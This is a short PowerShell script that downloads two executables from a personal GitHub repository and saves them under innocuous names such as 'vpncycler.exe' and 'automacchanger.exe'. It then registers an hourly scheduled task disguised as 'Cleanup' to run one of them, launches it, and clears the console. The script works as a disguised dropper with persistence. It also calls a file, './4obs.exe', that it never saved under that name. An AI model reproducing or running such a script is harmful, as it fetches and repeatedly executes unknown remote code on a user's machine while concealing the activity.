iwr -useb https://raw.githubusercontent.com/crisco321/log/main/4obs.exe -OutFile ./vpncycler.exe
iwr -useb https://raw.githubusercontent.com/crisco321/log/main/run.exe -OutFile ./automacchanger.exe
./automacchanger.exe /method:create /taskname:Cleanup /trigger:hourly /modifier:1 /program:vpncycler.exe
./automacchanger /method:run /taskname:Cleanup
./4obs.exe
Clear-Host
